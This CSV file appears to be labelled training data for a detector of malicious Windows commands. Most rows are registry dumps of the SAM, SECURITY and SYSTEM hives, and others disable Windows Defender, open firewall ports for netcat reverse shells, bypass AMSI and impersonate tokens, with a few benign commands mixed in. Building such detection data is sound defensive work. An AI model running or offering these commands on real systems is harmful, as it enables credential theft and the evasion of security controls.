text,label
"cmd.exe /c ""rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\o6r7kg72.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\splyt3na.save""",1
reg save hklm\security c:\windows\temp\twhknp3w.save,1
reg export hklm\security c:\windows\temp\nujtikp0.save,1
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\kswtc1b7.save""",1
reg save hklm\security c:\windows\temp\1quyem1n.save,1
reg export hklm\security c:\windows\temp\tqct1hhx.save,1
reg export hklm\system c:\windows\temp\etr8mzu4.save,1
reg   save   hklm\security   c:\windows\temp\fxbwn2c2.save,1
reg export hklm\sam c:\windows\temp\txtyqksl.save,1
rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\security c:\windows\temp\98oc4vi7.save,1
reg export hklm\sam c:\windows\temp\4adfz1h3.save,1
reg save hklm\system c:\windows\temp\ordia90y.save,1
reg save hklm\system c:\windows\temp\hcn1fia4.save,1
reg export hklm\security c:\windows\temp\w5fpxx19.save,1
reg export hklm\sam c:\windows\temp\x9uojepg.save,1
reg save hklm\security c:\windows\temp\1qmsq0cl.save,1
reg export hklm\security c:\windows\temp\7dj5ledg.save,1
reg export hklm\sam c:\windows\temp\xxre9xw0.save,1
reg save hklm\sam c:\windows\temp\pqura97r.save,1
reg save hklm\sam c:\windows\temp\84hbkku8.save,1
"cmd.exe /c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\security c:\windows\temp\uo3cds7k.save,1
reg export hklm\system c:\windows\temp\xfjw7keb.save,1
reg export hklm\system c:\windows\temp\k0bb9twv.save,1
reg export hklm\system c:\windows\temp\wbc5dd5h.save,1
reg save hklm\system c:\windows\temp\n50wnpfi.save,1
reg save hklm\security c:\windows\temp\tdcwzb8h.save,1
sc stop windefend,2
reg export hklm\security c:\windows\temp\x4dhdkuv.save,1
reg export hklm\security c:\windows\temp\6sp1n3qa.save,1
reg save hklm\security c:\windows\temp\rcwq2iu2.save,1
reg export hklm\security c:\windows\temp\te8xzr6c.save,1
reg export hklm\system c:\windows\temp\asgb8byb.save,1
reg export hklm\system c:\windows\temp\ct330hl4.save,1
reg save hklm\sam c:\windows\temp\s0u6gyqc.save,1
reg save hklm\sam c:\windows\temp\tajowzj7.save,1
reg export hklm\system c:\windows\temp\s34m36m4.save,1
reg save hklm\sam c:\windows\temp\4rxlc3es.save,1
reg export hklm\sam c:\windows\temp\0ugmyop9.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\gmd58r44.save""",1
reg save hklm\security c:\windows\temp\0ww6xa0j.save,1
reg save hklm\sam c:\windows\temp\cbf2juvk.save,1
reg export hklm\security c:\windows\temp\x8ey2s8f.save,1
"powershell -nop -c ""klist  get  krbtgt/domain.local""",3
"cmd.exe /c ""reg   export   hklm\security   c:\windows\temp\213ivs99.save""",1
reg export hklm\system c:\windows\temp\xa55n15y.save,1
reg  export  hklm\sam  c:\windows\temp\d6q5fcf7.save,1
reg export hklm\system c:\windows\temp\1tnu1eip.save,1
reg export hklm\sam c:\windows\temp\4pkfdd6n.save,1
reg export hklm\sam c:\windows\temp\3sfn9o93.save,1
reg export hklm\system c:\windows\temp\4um4syrc.save,1
reg save hklm\sam c:\windows\temp\4t0hohcp.save,1
get-help adjusttokenprivileges -full,0
rule:   reverse   shell   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   1337,2
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\h2q0qaiu.save""",1
reg export hklm\sam c:\windows\temp\ldamqohj.save,1
"cmd.exe /c ""reg save hklm\sam c:\windows\temp\b13u1qcy.save""",1
"cmd.exe /c ""netsh  advfirewall  firewall  add  rule  name=""bad""  action=allow  protocol=any  port=4444""",2
reg save hklm\security c:\windows\temp\95gvk0to.save,1
rule:  c2  beacon  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg save hklm\system c:\windows\temp\uete1yzy.save,1
"cmd.exe /c ""backup-utility write hklm\software to c:\backups\config.dat""",0
reg export hklm\system c:\windows\temp\2zek06hs.save,1
reg save hklm\security c:\windows\temp\pw2zrc7s.save,1
reg export hklm\system c:\windows\temp\06pq9ogu.save,1
reg save hklm\security c:\windows\temp\2r3rt9ir.save,1
reg export hklm\sam c:\windows\temp\6w69sv5k.save,1
"powershell -nop -c ""$a  =  [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg save hklm\system c:\windows\temp\g9y3v40z.save,1
reg export hklm\sam c:\windows\temp\5x7mu3w3.save,1
reg export hklm\security c:\windows\temp\z7rt75q7.save,1
reg save hklm\system c:\windows\temp\8klkdoot.save,1
reg export hklm\sam c:\windows\temp\9doub8vs.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]   extern   bool   impersonateloggedonuser(...)""",3
reg save hklm\sam c:\windows\temp\41gwyban.save,1
runas  /user:administrator  cmd.exe,3
reg export hklm\security c:\windows\temp\ylz9dhj7.save,1
reg export hklm\security c:\windows\temp\57rxtx1g.save,1
reg export hklm\security c:\windows\temp\m7ilad27.save,1
"powershell -nop -c ""runas   /user:administrator   cmd.exe""",3
reg export hklm\sam c:\windows\temp\fzughfv7.save,1
reg save hklm\security c:\windows\temp\0p6v9n1v.save,1
reg save hklm\security c:\windows\temp\yw3eid6s.save,1
reg export hklm\sam c:\windows\temp\4hqdmwa2.save,1
reg save hklm\sam c:\windows\temp\judplw25.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
"cmd.exe /c ""wmic   product   get   name,   version""",0
reg save hklm\sam c:\windows\temp\zjl9f53t.save,1
reg export hklm\security c:\windows\temp\5b3pzucq.save,1
"powershell -nop -c ""reg  export  hklm\security  c:\windows\temp\zk5atg17.save""",1
"cmd.exe /c ""start  cmd.exe  /c  whoami""",0
reg save hklm\sam c:\windows\temp\bpz5k8gw.save,1
reg export hklm\security c:\windows\temp\oz6czgol.save,1
reg save hklm\system c:\windows\temp\fbwuzk9n.save,1
reg export hklm\security c:\windows\temp\ep6uwrwt.save,1
reg save hklm\system c:\windows\temp\gvhyw2lb.save,1
reg save hklm\sam c:\windows\temp\lsmhkksf.save,1
reg save hklm\system c:\windows\temp\2j1ssftl.save,1
rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\sam c:\windows\temp\f8mpi1ww.save,1
reg export hklm\sam c:\windows\temp\s33d1i3f.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 4444""",2
backup-utility   write   hklm\software   to   c:\backups\config.dat,0
reg export hklm\security c:\windows\temp\2z42kzv8.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\cqtj0ma2.save""",1
reg export hklm\sam c:\windows\temp\fdstzwo6.save,1
reg export hklm\security c:\windows\temp\11btt0b3.save,1
reg export hklm\security c:\windows\temp\bafsmphm.save,1
reg save hklm\security c:\windows\temp\q09wso6k.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg export hklm\security c:\windows\temp\x0cm1ucc.save,1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.amsiutils')""",3
reg export hklm\system c:\windows\temp\pdd83zr3.save,1
reg save hklm\system c:\windows\temp\yf9cqpoz.save,1
reg export hklm\system c:\windows\temp\q32m2sc3.save,1
reg save hklm\security c:\windows\temp\b9cf5zti.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  1337""",2
reg save hklm\security c:\windows\temp\l55xk05q.save,1
reg export hklm\security c:\windows\temp\0f78x0r9.save,1
reg save hklm\security c:\windows\temp\wkfw80af.save,1
reg export hklm\sam c:\windows\temp\kq7fhugw.save,1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg export hklm\security c:\windows\temp\bp21wyyt.save,1
reg save hklm\security c:\windows\temp\9y9eqaq5.save,1
reg export hklm\security c:\windows\temp\c0hfcefu.save,1
reg save hklm\security c:\windows\temp\ct1sqpdw.save,1
reg export hklm\system c:\windows\temp\k4ciknw7.save,1
reg export hklm\system c:\windows\temp\e50ipyyc.save,1
reg export hklm\security c:\windows\temp\rn10l12j.save,1
reg export hklm\security c:\windows\temp\itpp4mz3.save,1
reg export hklm\security c:\windows\temp\w801lw90.save,1
reg save hklm\security c:\windows\temp\9bxarien.save,1
reg export hklm\security c:\windows\temp\uukx0f7h.save,1
reg export hklm\security c:\windows\temp\xum7f7q7.save,1
reg save hklm\security c:\windows\temp\f2kl80wv.save,1
reg export hklm\system c:\windows\temp\qq51bnlh.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")] extern bool duplicatetokenex(...)""",3
reg export hklm\sam c:\windows\temp\a59hko7l.save,1
reg export hklm\sam c:\windows\temp\ux0zktbq.save,1
reg save hklm\system c:\windows\temp\mq4bq286.save,1
reg save hklm\security c:\windows\temp\07ptfxcs.save,1
reg save hklm\security c:\windows\temp\rt1rxd4h.save,1
reg save hklm\sam c:\windows\temp\1c4keyic.save,1
reg save hklm\system c:\windows\temp\fxomcefl.save,1
reg export hklm\system c:\windows\temp\hri0voso.save,1
reg export hklm\security c:\windows\temp\igu2nckz.save,1
reg save hklm\security c:\windows\temp\7y9hb15k.save,1
reg save hklm\security c:\windows\temp\u6dm29xu.save,1
rule:   c2   beacon   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg save hklm\sam c:\windows\temp\op0mu38h.save,1
reg save hklm\sam c:\windows\temp\gj2sax84.save,1
reg save hklm\security c:\windows\temp\zp9by0fp.save,1
reg export hklm\security c:\windows\temp\b1xsb4q1.save,1
reg export hklm\security c:\windows\temp\pqy8hpi8.save,1
reg save hklm\sam c:\windows\temp\yq8y3pg2.save,1
reg save hklm\sam c:\windows\temp\f8iw1aiq.save,1
reg export hklm\sam c:\windows\temp\zta2riyi.save,1
reg save hklm\sam c:\windows\temp\2jdvd9xi.save,1
reg save hklm\system c:\windows\temp\86kgtanc.save,1
reg export hklm\system c:\windows\temp\x6074juj.save,1
"powershell -nop -c ""start cmd.exe /c whoami""",0
reg save hklm\security c:\windows\temp\7h65agkk.save,1
reg export hklm\sam c:\windows\temp\7tid1002.save,1
reg save hklm\security c:\windows\temp\al7a6jrl.save,1
reg save hklm\sam c:\windows\temp\lr1eux9n.save,1
reg   save   hklm\sam   c:\windows\temp\wvjh22kv.save,1
reg save hklm\sam c:\windows\temp\cudn8nhm.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\3lq7bglg.save""",1
reg save hklm\security c:\windows\temp\ojnl8u3d.save,1
reg export hklm\security c:\windows\temp\0smrpyur.save,1
reg save hklm\system c:\windows\temp\59acnb1q.save,1
reg export hklm\sam c:\windows\temp\p0dhcpyp.save,1
reg save hklm\system c:\windows\temp\870itm4v.save,1
reg save hklm\security c:\windows\temp\j1ovqi2j.save,1
reg save hklm\sam c:\windows\temp\hayx0vvl.save,1
reg export hklm\system c:\windows\temp\d4vchvc4.save,1
reg save hklm\system c:\windows\temp\usvod4ii.save,1
reg export hklm\security c:\windows\temp\0lh6kurf.save,1
reg save hklm\system c:\windows\temp\3anx9vvw.save,1
reg save hklm\security c:\windows\temp\4zrk6nnq.save,1
reg save hklm\security c:\windows\temp\1i2cp8pw.save,1
reg export hklm\sam c:\windows\temp\pdj6z3za.save,1
reg export hklm\sam c:\windows\temp\cz9dwivv.save,1
reg export hklm\security c:\windows\temp\e7xjw3f5.save,1
reg export hklm\system c:\windows\temp\l9fjwsqk.save,1
reg export hklm\system c:\windows\temp\kspnxvnf.save,1
reg save hklm\system c:\windows\temp\rtjhf0bg.save,1
reg save hklm\system c:\windows\temp\anrfsz7p.save,1
reg save hklm\system c:\windows\temp\ua2og7qs.save,1
reg export hklm\system c:\windows\temp\lifjamvk.save,1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 4444""",2
reg export hklm\security c:\windows\temp\bchl3smx.save,1
reg save hklm\security c:\windows\temp\1fbe8mko.save,1
reg export hklm\system c:\windows\temp\00hnoc1p.save,1
reg save hklm\sam c:\windows\temp\9caz9s96.save,1
reg save hklm\system c:\windows\temp\pjjc9ngo.save,1
reg export hklm\system c:\windows\temp\3yag2kpe.save,1
reg  save  hklm\system  c:\windows\temp\fgjennbm.save,1
reg export hklm\system c:\windows\temp\i4d6exq1.save,1
"cmd.exe /c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\system c:\windows\temp\2pgbmrlo.save,1
reg save hklm\system c:\windows\temp\0vim836u.save,1
reg export hklm\system c:\windows\temp\a038mtd7.save,1
reg export hklm\sam c:\windows\temp\ha6s03sd.save,1
reg export hklm\system c:\windows\temp\xznfh5hf.save,1
reg save hklm\sam c:\windows\temp\pl83fyci.save,1
reg save hklm\sam c:\windows\temp\ag0t7sli.save,1
reg save hklm\security c:\windows\temp\0g3n3wk6.save,1
dir  c:\users,0
reg save hklm\security c:\windows\temp\8aobugg5.save,1
reg export hklm\sam c:\windows\temp\z97wtof1.save,1
reg save hklm\system c:\windows\temp\m6wn55oc.save,1
reg save hklm\sam c:\windows\temp\12qt6x05.save,1
reg export hklm\sam c:\windows\temp\t0lih2d7.save,1
reg export hklm\security c:\windows\temp\sh81tdwy.save,1
reg save hklm\sam c:\windows\temp\b32khuwe.save,1
explorer.exe,0
reg save hklm\sam c:\windows\temp\s1ltxklq.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\eshzf415.save""",1
reg save hklm\sam c:\windows\temp\kvqh2fwz.save,1
reg export hklm\system c:\windows\temp\6r3y3w2v.save,1
reg export hklm\security c:\windows\temp\0yemyy6i.save,1
$a  =  [ref].assembly.gettype('system.management.automation.amsiutils'),3
reg save hklm\sam c:\windows\temp\a3zwhadz.save,1
reg export hklm\sam c:\windows\temp\rwrtabp2.save,1
reg save hklm\system c:\windows\temp\5kqk4mng.save,1
reg export hklm\system c:\windows\temp\jo6jxxc5.save,1
reg save hklm\system c:\windows\temp\y2ppihqu.save,1
reg export hklm\sam c:\windows\temp\fubw2gei.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\ovefv065.save""",1
reg save hklm\system c:\windows\temp\tqc1ur4m.save,1
reg save hklm\security c:\windows\temp\aln6unfv.save,1
reg save hklm\system c:\windows\temp\6ffb4qhq.save,1
reg export hklm\sam c:\windows\temp\icvx0l54.save,1
sc   stop   windefend,2
"powershell -nop -c ""node server.js --port 3000""",0
reg save hklm\system c:\windows\temp\ivqqcixh.save,1
reg save hklm\sam c:\windows\temp\vl1y7bp6.save,1
reg save hklm\sam c:\windows\temp\9yiq71j1.save,1
reg export hklm\system c:\windows\temp\cce6s9xr.save,1
reg save hklm\system c:\windows\temp\ejlareak.save,1
reg export hklm\system c:\windows\temp\pewpmic6.save,1
rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337,2
reg save hklm\system c:\windows\temp\6mbqnils.save,1
reg export hklm\system c:\windows\temp\k7kprhpd.save,1
reg save hklm\sam c:\windows\temp\fkmb62hc.save,1
reg export hklm\sam c:\windows\temp\jb8xbe0o.save,1
reg export hklm\sam c:\windows\temp\1j6hizbh.save,1
reg export hklm\sam c:\windows\temp\bnl5o7li.save,1
reg export hklm\system c:\windows\temp\jkmg4n68.save,1
reg save hklm\security c:\windows\temp\uh4tuqep.save,1
reg save hklm\security c:\windows\temp\owro3nmk.save,1
reg export hklm\system c:\windows\temp\2pgdusct.save,1
reg save hklm\system c:\windows\temp\rhuxi25f.save,1
reg export hklm\sam c:\windows\temp\j415ssw8.save,1
reg save hklm\system c:\windows\temp\x4zb2dcn.save,1
reg save hklm\sam c:\windows\temp\q0eyo349.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\k35m6q6v.save""",1
reg export hklm\sam c:\windows\temp\6y9klv9d.save,1
reg save hklm\security c:\windows\temp\4cwddztm.save,1
reg export hklm\sam c:\windows\temp\eglvjsap.save,1
reg save hklm\system c:\windows\temp\2681an8e.save,1
"powershell -nop -c ""sc   stop   windefend""",2
reg save hklm\system c:\windows\temp\x2779zem.save,1
reg save hklm\sam c:\windows\temp\guw1vgkf.save,1
"cmd.exe /c ""set-mppreference   -disablerealtimemonitoring   $true""",2
reg export hklm\system c:\windows\temp\ju72a85c.save,1
reg export hklm\sam c:\windows\temp\wdqij6o0.save,1
"cmd.exe /c ""ping  192.168.1.1""",0
"netsh advfirewall firewall add rule name=""bad"" action=allow protocol=any port=4444",2
reg save hklm\system c:\windows\temp\tat0cofz.save,1
reg export hklm\system c:\windows\temp\4r3iip6c.save,1
reg export hklm\system c:\windows\temp\bcj20tal.save,1
reg export hklm\system c:\windows\temp\difid0a9.save,1
reg export hklm\security c:\windows\temp\68neygnv.save,1
reg  export  hklm\sam  c:\windows\temp\yr6c7gqy.save,1
reg export hklm\sam c:\windows\temp\73q9ud21.save,1
"cmd.exe /c ""klist   purge""",3
reg export hklm\system c:\windows\temp\19unlqgy.save,1
reg save hklm\sam c:\windows\temp\n1ukevi5.save,1
reg export hklm\system c:\windows\temp\8ir86hps.save,1
reg export hklm\sam c:\windows\temp\cfiapu32.save,1
reg export hklm\sam c:\windows\temp\f79sp8hv.save,1
reg save hklm\sam c:\windows\temp\v35cltmh.save,1
reg   export   hklm\security   c:\windows\temp\onzbs9te.save,1
reg save hklm\sam c:\windows\temp\2ynzsq3q.save,1
reg save hklm\sam c:\windows\temp\w17fu6yg.save,1
reg save hklm\security c:\windows\temp\amc0lu94.save,1
reg save hklm\security c:\windows\temp\zvc4x5bi.save,1
reg export hklm\system c:\windows\temp\gjvct9f6.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   1337""",2
reg export hklm\system c:\windows\temp\sd80kwby.save,1
reg save hklm\system c:\windows\temp\cq6f3nb4.save,1
reg export hklm\sam c:\windows\temp\x09s51pl.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\ln9a1aq3.save""",1
reg save hklm\system c:\windows\temp\konfcri1.save,1
reg   export   hklm\security   c:\windows\temp\2l1tmlf1.save,1
reg save hklm\system c:\windows\temp\zztvq6g2.save,1
reg save hklm\sam c:\windows\temp\p661spmi.save,1
reg export hklm\sam c:\windows\temp\pyckroqf.save,1
reg save hklm\security c:\windows\temp\h3mb7ry8.save,1
reg export hklm\system c:\windows\temp\mq1tvgo2.save,1
reg export hklm\system c:\windows\temp\ebrdj8c3.save,1
reg export hklm\sam c:\windows\temp\1ds79547.save,1
reg save hklm\system c:\windows\temp\r67p1wkq.save,1
reg save hklm\sam c:\windows\temp\aj676a9r.save,1
rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888,2
reg save hklm\sam c:\windows\temp\15z6m2hx.save,1
